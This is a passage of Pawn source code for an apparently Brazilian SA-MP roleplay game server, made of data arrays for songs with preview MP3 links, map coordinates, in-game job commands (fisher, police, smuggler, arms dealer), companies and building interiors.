	{"Kaskade & Deadmau5 - I Remember",                                                        	"http://dc457.4shared.com/img/1072145392/afa8b880/dlink__2Fdownload_2FWT1z3diU_3Ftsid_3D20120111-032125-c49e1e86/preview.mp3",     	"House",        	201},
	{"David Guetta ft. Kid Cudi - Memories",                									"http://dc402.4shared.com/img/1072008629/11f3d790/dlink__2Fdownload_2FfrwDwa51_3Ftsid_3D20120111-013855-b9989e4f/preview.mp3",      "House",    	    210},
	{"Styx - Mr. Roboto",                                   									"http://dc183.4shared.com/img/1072013432/76df4586/dlink__2Fdownload_2F-x-AeAyr_3Ftsid_3D20120111-013251-db880fcf/preview.mp3",      "Synthpop", 	    328},
	{"Jay-Z ft. Alicia Keys - Empire State Of Mind",        									"http://dc442.4shared.com/img/1072006586/993aebe1/dlink__2Fdownload_2FBcNXQe-6_3Ftsid_3D20120111-014118-c4c7a853/preview.mp3",      "Hip Hop",			256},
	{"Vanessa Carlton - A Thousand Miles",                  									"http://dc300.4shared.com/img/1072011611/746d6a5b/dlink__2Fdownload_2F2oaqPULA_3Ftsid_3D20120111-014419-d6b82d5d/preview.mp3",      "Piano Rock",   	240},
	{"Village People - YMCA",                               									"http://dc437.4shared.com/img/1071404558/cb5c28ab/dlink__2Fdownload_2F563HNTkk_3Ftsid_3D20120110-170753-d9efa354/preview.mp3",     	"Gay/Fruta",		288},
	{"Village People - Macho Man",                          									"http://dc308.4shared.com/img/1071969016/8ff73ce0/dlink__2Fdownload_2Fy7cX7bop_3Ftsid_3D20120111-010957-82a33cf2/preview.mp3",      "Gay/Fruta",    	208},
	{"Tomboy - OK2BGAY",                                    									"http://dc121.4shared.com/img/1071421949/e144734a/dlink__2Fdownload_2FhXGjYQ0C_3Ftsid_3D20120110-172127-a6958804/preview.mp3",		"Gay/Fruta",		218}
};

new FunkSongs[][songInfo] = {
	{"Mc Biruleiby - Treme a Tabaca",        													"http://dc472.4shared.com/img/1074848185/9de67423/dlink__2Fdownload_2FCx1m0ocD_3Ftsid_3D20120112-161028-1593e0a0/preview.mp3",      "Funk",             182},
	{"Avassaladores - Sou Foda",                                                                "http://dc475.4shared.com/img/1072352560/2fcc09d3/dlink__2Fdownload_2FdyDVinDc_3Ftsid_3D20120111-221855-7d163ee2/preview.mp3",     	"Funk",    		 	140},
	{"Bola de Fogo - Atoladinha",                                                               "http://dc439.4shared.com/img/1072354077/8b133006/dlink__2Fdownload_2FJma8Vzam_3Ftsid_3D20120111-221926-3c97cafc/preview.mp3",     	"Funk",     		170},
	{"Bonde da Stronda - Mansão Thug Stronda",                                                  "http://dc309.4shared.com/img/1072356692/cb7e5d3e/dlink__2Fdownload_2FsQdkC6tx_3Ftsid_3D20120111-222004-d1255706/preview.mp3",     	"Funk",     		385},
	{"Bonde do Tigrão - Cabecinha",                                                             "http://dc424.4shared.com/img/1072356295/52136041/dlink__2Fdownload_2FiSZkFgey_3Ftsid_3D20120111-222331-48b181b3/preview.mp3",     	"Funk",     		221},
	{"Bonde do Tigrão - Cerol Na Mão",                                                          "http://dc305.4shared.com/img/1072358253/f71afd4b/dlink__2Fdownload_2F4cEn8Su_5F_3Ftsid_3D20120111-222359-84140b56/preview.mp3",   	"Funk",     		161},
	{"Bonde do Tigrão - Me Usa",                                                               	"http://dc351.4shared.com/img/1072359517/29e88db6/dlink__2Fdownload_2FtuhOmBBJ_3Ftsid_3D20120111-222445-d8faca2a/preview.mp3",     	"Funk",     		164},
	{"Bonde do Tigrão - Prisioneira",                                                           "http://dc432.4shared.com/img/1072360292/aebcd0ee/dlink__2Fdownload_2FsTl2p4o0_3Ftsid_3D20120111-222515-3a5a594/preview.mp3",     	"Funk",     		194},
	{"Lil Jon ft. Mr Catra Mulher Filé - Machuka",                                             	"http://dc312.4shared.com/img/1072361840/40372d3c/dlink__2Fdownload_2FS6HjSXtl_3Ftsid_3D20120111-222617-4fe7e548/preview.mp3",     	"Funk",     		193},
	{"Mc Boy do Charme - Imagine Eu De Megane Ou De 1100",                                      "http://dc238.4shared.com/img/1072362913/b73e4d1a/dlink__2Fdownload_2F7kebmQrt_3Ftsid_3D20120111-222728-399f0fd/preview.mp3",     	"Funk",     		188},
	{"Mc Buiu - Ela Balança Mas Não Pára",                                      				"http://dc433.4shared.com/img/1072363765/a33e3487/dlink__2Fdownload_2F8XsCZDin_3Ftsid_3D20120111-222925-81490041/preview.mp3",     	"Funk",     		168},
	{"Mc Créu - Dança Créu",                                      								"http://dc361.4shared.com/img/1072365867/63074d4a/dlink__2Fdownload_2F15unmQut_3Ftsid_3D20120111-222757-febe1479/preview.mp3",     	"Funk",     		257},
	{"Mc Diguinho - Vou Passar A Noite Com Elas",                                      			"http://dc426.4shared.com/img/1072366200/b41b5557/dlink__2Fdownload_2FpFLquEvv_3Ftsid_3D20120111-223108-1646577c/preview.mp3",     	"Funk",     		220},
	{"Mc Duzinho - Vou Morar No Cabaré",                                      					"http://dc110.4shared.com/img/1072344264/35e5ad23/dlink__2Fdownload_2FRNvdSpsR_3Ftsid_3D20120111-223144-f427d6c3/preview.mp3",     	"Funk",     		190},
	{"Mc Guime - Tá Patrão",                                      								"http://dc121.4shared.com/img/1072343877/25b770b7/dlink__2Fdownload_2F8VrOVElC_3Ftsid_3D20120111-223313-7c93c739/preview.mp3",     	"Funk",     		189},
	{"Mc Lon - Novinha Chora",                                      							"http://dc408.4shared.com/img/1072346011/a343d38e/dlink__2Fdownload_2FPyiEs440_3Ftsid_3D20120111-223755-673c9add/preview.mp3",     	"Funk",     		190},
	{"Mc Luan - Casa das Primas",                                      							"http://dc172.4shared.com/img/1072346009/b4836afd/dlink__2Fdownload_2Fw2X5P2VA_3Ftsid_3D20120111-224307-28fad4e7/preview.mp3",     	"Funk",     		161},
	{"Mc Luan - É Só Pentada Violenta",                                      					"http://dc299.4shared.com/img/1072350251/dca0b488/dlink__2Fdownload_2FZINCZJiT_3Ftsid_3D20120111-225055-b2701f1e/preview.mp3",     	"Funk",     		141},
	{"Mc Roba Cena - Parado Na Esquina",                                      					"http://dc256.4shared.com/img/1072350832/1e64c762/dlink__2Fdownload_2Fs3itgi2X_3Ftsid_3D20120111-225316-6bcb2d68/preview.mp3",     	"Funk",     		180},
	{"Mr Catra - Ela Dá Pá Nóis Que Nóis É Patrão",                                      		"http://dc125.4shared.com/img/1072352332/b838e008/dlink__2Fdownload_2FuXQ8FGa4_3Ftsid_3D20120111-225409-5bc16ca/preview.mp3",     	"Funk",     		183},
	{"Mr Catra - Uh Papai Chegou",                                      						"http://dc396.4shared.com/img/1072332410/ee0f0083/dlink__2Fdownload_2F97xB_5Fmia_3Ftsid_3D20120111-225432-40503046/preview.mp3",    "Funk",     		546},
	{"Mr Catra - Pode Me Dar",                                                                  "http://dc280.4shared.com/img/1073985739/4a484586/dlink__2Fdownload_2Fr1FIfAyr_3Ftsid_3D20120112-151450-afc36aee/preview.mp3",     	"Funk",     		180},
	{"Mulher Melão - Você Quer",                                      							"http://dc455.4shared.com/img/1072330658/2d355150/dlink__2Fdownload_2FYJSoqcvu_3Ftsid_3D20120111-225503-14c4e7b5/preview.mp3",     	"Funk",     		155},
	{"Bonde da Juju Backdi e Bio G3 - Bonde da Oakley",                                         "http://dc192.4shared.com/img/1073984311/c910608f/dlink__2Fdownload_2FgpHKG-iy_3Ftsid_3D20120112-151527-6693a08e/preview.mp3",     	"Funk",     		174},
    {"Os Hawaianos - Vou Dormir No Puteiro",                                                    "http://dc469.4shared.com/img/1073984383/f6dcbaea/dlink__2Fdownload_2FP1w76RUU_3Ftsid_3D20120112-151644-cf7a21c4/preview.mp3",     	"Funk",     		143},
    {"Mc Magrinho - Pela Estrada Fora",                                                    		"http://dc262.4shared.com/img/1073987637/63bca3d/dlink__2Fdownload_2FYPiqk0JY_3Ftsid_3D20120112-151719-5a0a5040/preview.mp3",     	"Funk",     		163},
    {"Vanessa Carlton - A Thousand Miles",                  									"http://dc300.4shared.com/img/1072011611/746d6a5b/dlink__2Fdownload_2F2oaqPULA_3Ftsid_3D20120111-014419-d6b82d5d/preview.mp3",      "Piano Rock",   	240}
};

new Float:IceCreamPlaces[][3] = {
    {2076.3848,		-1733.0042,		13.5469},
	{1176.6527,		-1704.6572,		13.8879},
	{962.9757,		-1467.7639,		13.4774},
	{816.9569,		-1388.4523,		13.6182},
	{760.6097,		-1600.7350,		13.4187},
	{2145.4211,		-991.4246,		61.7636},
	{2455.4146,		-1096.6976,		42.9169},
	{2808.9885,		-1182.8438,		25.3433},
	{2792.7083,		-1944.9254,		13.5469}
};

new Float:DrugPlaces[][3] = {
    {2013.2772,		-1717.0242,		13.5547},
	{1999.8834,		-1114.8395,		27.1318},
	{2249.8291,		-1236.4523,		25.6999},
	{2498.2324,		-1642.6064,		13.7826},
	{2069.0466,		-1588.7394,		13.4913},
	{1929.3640,		-1917.4486,		15.2568},
	{1734.5961,		-2127.8760,		13.5469},
	{1440.1974,		-926.2419,		39.6477},
	{876.4865,		-968.6357,		37.1875},
	{2101.3157,		-1333.4294,		25.5391}
};

new Float:CementPlaces[][3] = {
    {1263.7675,		-1248.1825,		14.0767},
	{2126.2158,		-2149.6719,		13.1058},
	{188.2019,		-1416.9620,		45.6156}
};

new Float:PostPlaces[][3] = {
    {848.2285,		-1388.2196,		13.3237},
	{1045.4771,		-1251.6278,		14.7071},
	{2011.5461,		-1004.8133,		30.5453},
	{2280.1265,		-1282.6753,		23.5943},
	{2350.2551,		-1481.4891,		23.5982},
	{2470.5903,		-1683.2859,		13.0831},
	{2450.1934,		-1939.5814,		13.1334},
	{2072.9294,		-1878.8877,		13.1433},
	{1831.4937,		-1796.7869,		13.1266},
	{510.2972,		-1255.0681,		15.6861},
	{412.4169,		-1251.8536,		51.3139},
	{1143.4722,		-625.9899,		103.4638},
	{2108.1741,		-1744.7280,		13.1551},
	{2379.0840,		-1268.6937,		23.6004},
	{2379.1836,		-1268.7821,		23.5997},
	{2762.4365,		-1266.0337,		54.9541},
	{2473.4529,		-1028.1644,		62.6553},
	{2418.0730,		-1477.7163,		23.5089}
};

//Comandos de profissoes
enum jCmdInfo
{
	jCmd[128],
	jDescription[128],
	jJobs[6]
}

new JobCommands[][jCmdInfo] = {
//Comandos
    {"/coletarlata", 												"Inicia a coleta de latas pela cidade.",  								{JOB_UNEMPLOYED}},
	{"/minhaslatas", 												"Ver a quantidade de latas que você coletou.",  						{JOB_UNEMPLOYED}},
	{"/venderlatas",    											"Vende as latas coletadas.",  											{JOB_UNEMPLOYED}},
	{"/abastecermobilete",											"Abastecer sua mobilete com 3 pizzas, você deve estar na Pizzaria.",	{JOB_PIZZABOY}},
	{"/pizza",														"Iniciar alguma ação de pizzaboy.",  									{JOB_PIZZABOY}},
	{"/bebida [id] [bebida]", 										"Oferecer uma bebida a um jogador.",  									{JOB_BARMAN}},
	{"/entregarbebidas",											"Abastecer um local com bebidas.",  									{JOB_BARMAN}},
	{"/abastecimentos",												"Verificar os locais que necessitam bebidas.",  						{JOB_BARMAN}},
	{"/pegariscas [quantidade de iscas]", 							"Para pegar iscas (Você deve estar no ícone aonde pega profissão).",  	{JOB_FISHER}},
	{"/pescar",														"Joga a rede para pescar, você deve estar no pier de pesca.",  			{JOB_FISHER}},
	{"/venderpesca",												"Vende seu pescado em qualquer restaurante.",  							{JOB_FISHER}},
	{"/minhasiscas",												"Ver sua quantidade de iscas.",  										{JOB_FISHER}},
	{"/entregas",                                                   "Inicia e cancela a entrega de pacotes pela cidade.",					{JOB_CABBIE}},
	{"/coletarlixo",                                                "Inicia a coleta de lixo pela cidade.",                                 {JOB_GARBAGE}},
	{"/lixao",                                                      "Descarregar o lixo, você deve estar no Lixão.",                        {JOB_GARBAGE}},
	{"/leite [ordenhar/vender]",                                    "Ordenhar uma vaca e vender o leite.",                                  {JOB_FARMER}},
	{"/milho [plantar/vender]",                                    	"Plantar e vender milho.",                                  			{JOB_FARMER}},
	{"/contrabando",                                    			"Iniciar/finalizar contrabando.",                                  		{JOB_SMUGGLER}},
	{"/transporte",                                                 "Inicia algum carregamento.",                                           {JOB_TRUCKER}},
	{"/anunciar [texto]",											"Publicar um anúncio.",  												{JOB_JOURNALIST}},
	{"/consertar [id]",												"Consertar um veículo.",  												{JOB_MECHANIC}},
	{"/pintar [cor 1] [cor 2]",										"Pintar um veículo.",  													{JOB_MECHANIC}},
	{"/instalar [kit/fume/airbag]",									"Instalar acessórios em um veículo",  									{JOB_MECHANIC}},
	{"/pegarkit",													"Pegar 3 kits médicos para realizar curativos e tratamentos.",  		{JOB_PARAMEDIC}},
	{"/curativo [id]",												"Aplicar curativo em um jogador.",  									{JOB_PARAMEDIC}},
	{"/tratar [id]",												"Realiza o tratamento para remover alcool e drogas no sangue.", 		{JOB_PARAMEDIC}},
	{"/salvar",														"Salvar um jogador, ele deve estar inconsciente.",  					{JOB_PARAMEDIC}},
	{"/transportar",												"Iniciar o transporte do malote.",  									{JOB_SECURITY}},
    {"/escolta",													"Solicitar escolta policial para transportar o malote.",  				{JOB_SECURITY}},
    {"/limo [lavar/revisar]",										"Lavar/revisar uma limosine da companhia.",  							{JOB_DRIVER}},
	{"/arma [pegar/vender]",                                        "Vender armas para algum jogador ou pegar na Ammu Nation.",       		{JOB_ARM_DEALER}},
	{"/colete [pegar/vender]",                                      "Vender colete para algum jogador ou pegar na Ammu Nation.",     		{JOB_ARM_DEALER}},
	{"/explosivo [pegar/vender]",                                   "Vender explosivos para algum jogador ou pegar na Ammu Nation.",     	{JOB_ARM_DEALER}},
	{"/cigarro [pegar/vender]",										"Pegar ou vender cigarro.",  											{JOB_DRUG_DEALER}},
	{"/assaltar",													"Iniciar um assalto em um local.",										{JOB_DRUG_DEALER}},
	{"/desmanchar",													"Vender um veículo para o desmanche.",									{JOB_DRUG_DEALER}},
	{"/desmanche",													"Ver a atual oferta do desmanche.",  									{JOB_DRUG_DEALER}},
	{"/tribunal [id 1] [id 2]",                                     "Inicia um julgamento.",                                                {JOB_JUDGE}},
    {"/declararpreso [id] [minutos] [fianca]",                      "Decreta a prisão de um jogador.",                                      {JOB_JUDGE}},
    {"/fimtribunal",                                     			"Finaliza um julgamento.",                                              {JOB_JUDGE}},
	{"/arsenal",                                                	"Pegar equipamento na delegacia.",                                      {JOB_POLICE, JOB_SWAT, JOB_DELEGATE}},
	{"/policia",													"Ver os policiais conectados no servidor e seus cargos.",				{JOB_POLICE, JOB_SWAT, JOB_DELEGATE}},
	{"/bafometro [id]",												"Realizar o teste do bafometro em um jogador.",  						{JOB_POLICE, JOB_SWAT, JOB_DELEGATE}},
	{"/multar [pessoa/veiculo] [id] [quantidade]",					"Aplicar uma multa em um jogador ou veiculo.",  						{JOB_POLICE, JOB_SWAT, JOB_DELEGATE}},
	{"/vdocs [placa]",												"Ver os documentos de um veículo.",  									{JOB_POLICE, JOB_SWAT, JOB_DELEGATE}},
	{"/fiscalizar [objeto]",										"Fiscalizar objetos de um jogador.",  									{JOB_POLICE, JOB_SWAT, JOB_DELEGATE}},
	{"/revistar",													"Revistar um jogador.",  												{JOB_POLICE, JOB_SWAT, JOB_DELEGATE}},
    {"/examinararea [id]",											"Examinar uma área com outro policial.",  								{JOB_POLICE, JOB_SWAT, JOB_DELEGATE}},
	{"/apreenderveiculo",											"Apreender um veículo por dívidas.",  									{JOB_POLICE, JOB_SWAT, JOB_DELEGATE}},
	{"/algemar",													"Algemar um jogador.",  												{JOB_POLICE, JOB_SWAT, JOB_DELEGATE}},
	{"/desalgemar",													"Tirar as algemas de um jogador.",  									{JOB_POLICE, JOB_SWAT, JOB_DELEGATE}},
    {"/prender",													"Aprisionar um jogador.",  												{JOB_POLICE, JOB_SWAT, JOB_DELEGATE}},
    {"/ficha [nome]",												"Ver a ficha criminal de um jogador.",  								{JOB_POLICE, JOB_SWAT, JOB_DELEGATE, JOB_LAWYER, JOB_JUDGE}},
	{"/soltar [id]",												"Libertar um jogador da prisão.", 	 									{JOB_SWAT, JOB_DELEGATE, JOB_JUDGE}},
    {"/procurar [id]",												"Colocar um jogador na lista de procurados.",  							{JOB_DELEGATE}},
	{"/desprocurar [id]",											"Remover um jogador da lista de procurados.",  							{JOB_DELEGATE}},
    {"/promover [id]",												"Promover um jogador na carreira policial.",  							{JOB_DELEGATE}},
    {"/rebaixar [id]",												"Rebaixar um jogador na carreira policial.",  							{JOB_DELEGATE}},
//Descrições
	{"", "Essa profissão não costuma trazer muito futuro aos jogadores, sugerimos pegar outra,", 											{JOB_UNEMPLOYED}},
	{"", "para isso, vá em sua respectiva agência, como Pizzaria, Bar, Cooperativa de Pesca,", 												{JOB_UNEMPLOYED}},
	{"", "na dúvida, consulte o gps, /gps [local]", 																						{JOB_UNEMPLOYED}},
	{"", "Nos veículos da sua profissão, você pode usar o rádio (/r [texto]) para conversar com os outros jogadores.",                      {JOB_PIZZABOY, JOB_CABBIE, JOB_PARAMEDIC}},
	{"", "Utilize o rádio (/r [texto]) nas viaturas para se comunicar com os outros policiais do departamento.",                            {JOB_POLICE, JOB_SWAT, JOB_DELEGATE}},
	{"", "Através do comando /pizza, você poderá realizar vendas e entregas de pizzas pela cidade.",                                        {JOB_PIZZABOY}},
	{"", "Para pedir pizza, os clientes poderão digitar \"/servico pizza\"",                                                                {JOB_PIZZABOY}},
	{"", "Cuidado! Se o seu cliente for pego dirigindo bêbado, será preso, informe-o!",                                                     {JOB_BARMAN}},
	{"", "Locais que precisam ser abastecidos: Discoteca, Boate, Restaurante e Bar.",                                                       {JOB_BARMAN}},
	{"", "O taxímetro irá iniciar automaticamente quando um passageiro entrar em seu veículo.",                                             {JOB_CABBIE}},
	{"", "Dirija com cuidado, evite acidentes, e em caso de dúvidas, use o gps (/gps [local]).",                                            {JOB_CABBIE}},
	{"", "Entre em algum ônibus para começar a entrar em circulação pelos terminais, caso algum passageiro entrar,",            			{JOB_MACHINIST}},
	{"", "você irá receber o dinheiro do Ticket, também poderá usar o trem, mas cobre manualmente (/pagar).",                             	{JOB_MACHINIST}},
	{"", "As rotas variam, fazendo com que cada ônibus passe por determinados locais, ao entrar em um terminal, o jogador",                 {JOB_MACHINIST}},
	{"", "será informado dos próximos pontos e da quantidade de ônibus em circulação na rota.",                                             {JOB_MACHINIST}},
	{"", "Você precisa ter pelo menos 1L de leite para poder vender, venda-o na fazenda.",                                                  {JOB_FARMER}},
    {"", "Você precisa estar em uma combine da fazenda para plantar milho, e poderá vender no mínimo 2kg.",                                 {JOB_FARMER}},
    {"", "Climas chuvosos irão agilizar o plantio, não saiá da área de plantio enquanto estiver plantando.",                                {JOB_FARMER}},
    {"", "Se a policia te pegar contrabandeando, você será preso, e a mercadoria, apreendida. Contrabandos disponíveis:",                   {JOB_SMUGGLER}},
    {"", "- Pacote: Contrabando no navio em San Fierro perto da boate do Jizzy's.",                                							{JOB_SMUGGLER}},
    {"", "- Carros: Contrabando de carros, o traficante do morro pede, os triads checam e dispacham o carro.",                              {JOB_SMUGGLER}},
    {"", "- Armas: Contrabando de armas ilegais.",                              															{JOB_SMUGGLER}},
    {"", "- Drogas: Contrabando de drogas, o traficante do morro lhe informa onde você pode conseguir grana transportando drogas.",         {JOB_SMUGGLER}},
	{"", "Você receberá conforme a kilometragem rodada, carregamentos disponíveis:",                                                        {JOB_TRUCKER}},
	{"", "- Alimentos: Carga comestível é sempre boa, mas transporte rápido, para não perder a validade!",                                  {JOB_TRUCKER}},
	{"", "- Combustível: Cuidado! A carga é perigosa, dirija com cuidado!",                                                                 {JOB_TRUCKER}},
	{"", "- Brinquedos: A carga é a alegria e o destino, a diversão! =D",                                                                   {JOB_TRUCKER}},
	{"", "Não anuncie bobagens, evite erros de escrita, não abrevie palavras, por exemplo: trocando \"que\" por \"q\".",                    {JOB_JOURNALIST}},
	{"", "Peça para os jogadores pagarem os anúncios com /pagar",                                                                           {JOB_JOURNALIST}},
	{"", "Você poderá transportar pessoas através de um Shamal ou Maverick, ou mercadorias através de um Rustler.",                         {JOB_PILOT}},
	{"", "Através do Maverick, você poderá transportar as pessoas pela cidade, e pelo Shamal ou Rustler, irá transportar",                  {JOB_PILOT}},
    {"", "pessoas ou mercadorias para os aeroportos de Los Santos, San Fierro e Las Venturas.",                               				{JOB_PILOT}},
	{"", "Não esqueça de cobrar, solicite aos jogadores para usarem /pagar",                                                                {JOB_PILOT}},
	{"", "Você poderá ser assaltado durante o transporte do malote, portanto, proteja seu carro forte com a escolta.",                      {JOB_SECURITY}},
    {"", "Assaltantes irão roubar o malote caso te matarem, procure andar com proteção.",                                    				{JOB_SECURITY}},
    {"", "OBS: Caso o malote for roubado, você perderá dinheiro.",                                                                          {JOB_SECURITY}},
    {"", "Leve as limosines em alguma oficina para revisá-las, e leve-as em um posto de combustível para lavá-las.",                        {JOB_DRIVER}},
    {"", "Você deverá pegar os itens em qualquer Ammu Nation e vende-los para outros jogadores.",                                           {JOB_ARM_DEALER}},
    {"", "Poderá carregar no máximo 3 armas, 2 coletes e 4 explosivos.",                                           							{JOB_ARM_DEALER}},
	{"", "Para ver as armas disponíveis digite /armas",                                                                                     {JOB_ARM_DEALER}},
    {"", "Matando os seguranças que estiverem transportando o malote, você o roubará, aja rápido, o transporte vai da Area Forte",          {JOB_DRUG_DEALER}},
    {"", "em Las Venturas até qualquer banco, mas não deixe-o entrar no banco, caso contrário perderá o malote.",          					{JOB_DRUG_DEALER}},
	{"", "Você também poderá oferecer seus serviços a algum jogador, e solicitar o pagamento através do comando /pagar.",                   {JOB_SECURITY, JOB_DRIVER}},
	{"", "Os jogadores podem solicitar seu serviço com o comando /meuadvogado [id] durante um julgamento.",                                 {JOB_LAWYER}},
	{"", "Esteja na Delegacia ou Tribunal para checar a ficha criminal de alguém, talvez poderá lhe ajudar nos argumentos.",                {JOB_LAWYER}},
	{"", "Seu objetivo é defender seus clientes de acusações perante a presença de um Juiz.",                                               {JOB_LAWYER}},
	{"", "Evite discussões fora do julgamento no Tribunal, podem causar problemas à você e seu cliente...",                                 {JOB_LAWYER}},
	{"", "OBS: Fiança no valor de $0,00 dólares = sem fiança.",                                                                             {JOB_JUDGE}}
};

//Empresas
enum companyInfo
{
	cType[64],
	cName[64],
	cFile[64],
	cValue,
	cJob,
	Float:cX,
	Float:cY,
	Float:cZ,
	cMapIconId
}

new Companies[][companyInfo] = {
	{NULL},
	{"Cooperativa de Pesca",            "Tá Nervoso? Venha Pescar!",  	"Fish",				75000,         	JOB_FISHER,               	408.9590,    	-2087.7498,    	7.8359},
	{"Companhia de Taxi",				"Yellow's'Taxi",          		"Taxi",				80000,			JOB_CABBIE,					1742.4248,    	-1863.8626,    	13.5745,	42},
	{"Bar",	 							"Drinque da Glória",  			"Bar",				60000,			JOB_BARMAN,					2322.8696,    	-1646.3642,    	14.8270},
	{"Pizzaria", 						"A Vida é Massa",        		"Pizza",			60000,			JOB_PIZZABOY,				2098.5437,    	-1806.6945,    	13.5546},
	{"Lixao",                           "Cof Cof",                 		"Trash",            50000,          JOB_GARBAGE,                2191.3544,    	-1970.7531,    	13.5599,    51},
	{"Hospital",						"Guardian Angels",         		"Hospital",			0,				JOB_PARAMEDIC,         		2036.6701,    	-1409.8912,    	17.1640},
	{"Delegacia",	      				"LSPD",							"Police",			0,				JOB_POLICE, 		  		1545.6605,    	-1675.6268,    	13.5607},
    {"Area de Contrabando",          	"All About The Money",  		"Smuggling",        50000,         	JOB_SMUGGLER,               2748.7475,    	-2450.2841,    	13.6484,	51},
	{"Fazenda",                         "VS FarmVille",             	"Farm",             175000,         JOB_FARMER,                 -1060.2819,    	-1205.5056,    	129.2187,  	62},
	{"Noticiario",                      "Inside",       				"News",             120000,         JOB_JOURNALIST,             732.8124,    	-1358.3757,    	23.5792,    58},
	{"Aeroporto",                       "Los Santos Intenational",  	"Airport",          0,         		JOB_PILOT,                 	1965.6682,		-2172.5632,		13.4233,	5},
    {"Companhia de Limosines",          "Lux, Chauffeur & Cia",  		"Limo",          	125000,         JOB_DRIVER,                 1219.1621,    	-1812.6396,    	16.5937,	43},
    {"Area Forte",          			"Chuff Security Co.",  			"Security",         0,         		JOB_SECURITY,               2546.7180,    	1972.0599,    	10.8203,	54},
	{"Oficina",			    			"The Car Point",				"Custom",			75000,			JOB_MECHANIC,               2131.8483,    	-1150.6437,    	24.1351},
	{"Loja de armas",			    	"Ammu Nation",					"Weapon",			90000,			JOB_ARM_DEALER,             1366.4621,    	-1287.1163,    	13.5468},
	{"Transportes Publicos",  			"Ride Of The State",			"Transport",		0,              JOB_MACHINIST,   			1753.6323,    	-1894.3092,    	13.5571,	56},
	{"Transportadora",  				"The Flash",					"Truck",			70000,          JOB_TRUCKER,   				-64.3218,    	-1122.6071,    	1.0781,		51},
	{"Laboratorio de Drogas",           "Beck's Place",					"Crack",			150000,         JOB_DRUG_DEALER,         	2270.4401,    	-1033.6555,    	51.8252,	16},
	{"Advocacia",   					"VS & Associated Lawyers",		"Lawyer",			140000,         JOB_LAWYER,              	1207.4970,    	-1438.9748,    	13.3828,	60},
	{"Tribunal",                		"LSCJ",  						"Tribunal",			0,              JOB_JUDGE,               	1481.4100,    	-1750.1783,    	15.4453}
};

new Company[MAX_SLOTS] = 0;

//Interiores
enum intInfo
{
	intName[64],
	intMapIconId,
	intPickupId,
	Float:intX,
	Float:intY,
	Float:intZ,
	intInt
}

new Ints[][intInfo] = {
    {"Banco",					52,			1274,			2304.9233,			-16.1500,			26.7422,			0},
    {"24/7",   					61,			1314,       	-25.6997,    		-141.5493,    		1003.5468,      	16},
	{"Loteria",					25,			1274,			-2158.9619,			643.1372,			1052.3750,			1},
	{"Loteria de Cavalos",		25,			1274,			834.6589,			7.5835,				1004.1870,			3},
	{"Discoteca",				48,			1318,			493.3904,			-24.8727,			1000.6797,			17},
	{"Boate",					21,			1240,			1204.7952,    		-13.8479,    		1000.9218,			2},
	{"Restaurante",				50,			2804,			681.5834,    		-451.5157,    		-25.6171,			1},
	{"Bar",						49,			1484,			-229.2940,    		1401.1772,    		27.7656,			18},
	{"Binco",					45,			1275,			207.6461,    		-111.2516,    		1005.1328,			15},
    {"Sub Urban",               45,         1275,           203.9669,    		-50.6596,    		1001.8046,          1},
	{"Pro Laps",               	45,         1275,           207.1258,    		-140.3740,    		1003.5078,          3},
	{"Victim",					45,			1275,			227.3106,    		-8.0155,    		1002.2109,			5},
	{"Didier Sachs",            45,         1275,           204.2721,    		-168.6051,    		1000.5234,          14},
	{"Ammu Nation",				6,			355,			315.6814,			-143.6524,			999.6016,			7},
	{"Loja de Donuts",			10,			2222,			376.9800,			-193.3057,			1000.6328,			17},
	{"Pizzaria",				29,			2220,			372.2168,    		-133.5224,    		1001.4921,			5},
	{"Cluckin Bell",			14,			2217,			364.8025,    		-11.5283,    		1001.8515,			9},
	{"Burger Shot",				10,			2212,			362.8225,    		-75.1082,    		1001.5078,    		10},
	{"Delegacia",				30,			1247,			246.7658,    		62.3306,   			1003.6406,			6},
    {"Interrogatorio",          0,          1247,           322.0925,    		302.3671,    		999.1484,          	5},
	{"Tribunal",				42,			1247,			246.4103,			107.3036,			1003.2188,			10},
	{"Seguradora",				59,			1240,			2161.0681,    		1602.3133,    		999.9813,			1},
	{"Imobiliaria",          	62,         1277,           2161.0681,    		1602.3133,    		999.9813,          	1},
	{"Loja de Brinquedos",      55,         1277,           -2240.7797,    		137.2012,    		1035.4140,          6},
	{"World of Coq",            49,         1544,           453.5234,    		-18.1104,    		1001.1328,          1},
	{"Sex Shop",            	38,         322,           	-100.2039,    		-25.0358,    		1000.7187,          3},
	{"Fazenda",                 0,          1318,           293.0435, 			310.0034, 			999.1484,           3},
	{"Virtual Hotel",         	43,         1318,           2214.3918,    		-1150.5471,    		1025.7968,          15},
	{"Baile Funk",              48,			1318,			493.3904,			-24.8727,			1000.6797,			17},
	{"",                        0,          1318,           505.1540,    		-1641.0096,    		58.5904,            0},
	{"",                   		44,         1318,           1490.0771,    		-1894.9763,    		22.2144,            0},
	{"",                 		44,         1318,           1024.3375,    		-996.1218,    		42.8116,            0},
	{"",                        44,         1318,           1548.6151,    		-1363.9852,    		326.2182,           0},
	{"",                        44,         1318,           1765.3450,    		-2271.8232,    		26.7960,            0}
};

enum enterInfo
{
	intId,
	Float:enterX,
	Float:enterY,
	Float:enterZ,
	enterVirtualWorld,
	enterInt,
	enterPrev
}

new Enters[][enterInfo] = {
    {INT_BANK,					1778.9866,		-1663.1512,		14.4378,		1},
    {INT_BANK,					1309.9051,    	-1367.6707,    	13.5386,		2},
    {INT_BANK,					2861.1401,    	-1440.1130,    	10.9375,		3},
    {INT_BANK,					419.7694,    	-1428.4282,    	32.4906,		4},
    {INT_BANK,                  648.6725,    	-519.2705,    	16.5536,        5},
    {INT_BANK,                  930.8440,    	-1503.0737,    	13.5509,        6},
    {INT_BANK,                  2299.4299,    	-16.1250,    	26.4843,        7},
	{INT_24/7_SHOP,				1929.2303,    	-1776.2890,    	13.5468,		1},
	{INT_24/7_SHOP,				1833.7675,    	-1842.4935,    	13.5781,		2},
	{INT_24/7_SHOP,				1352.5648,    	-1759.2410,    	13.5078,		3},
	{INT_24/7_SHOP,				1315.5538,    	-897.6950,    	39.5781,		4},
	{INT_24/7_SHOP,				1000.5819,    	-919.8594,    	42.3281,		5},
	{INT_24/7_SHOP,             -78.6046,    	-1169.6219,    	2.1435,         6},
	{INT_24/7_SHOP,             2001.9715,    	-1761.9353,    	13.5390,        7},
	{INT_24/7_SHOP,             822.0765,    	-557.3056,    	16.3359,        8},
	{INT_24/7_SHOP,             1257.8979,    	204.3220,    	19.7174,        9},
	{INT_24/7_SHOP,             2250.1760,    	52.8009,    	26.6671,        10},
	{INT_LOTTERY,    	 		1739.3049,		-1582.2778,		14.1538},
	{INT_HORSE_LOTTERY,     	1631.8197,		-1172.9270,		24.0843,		1},
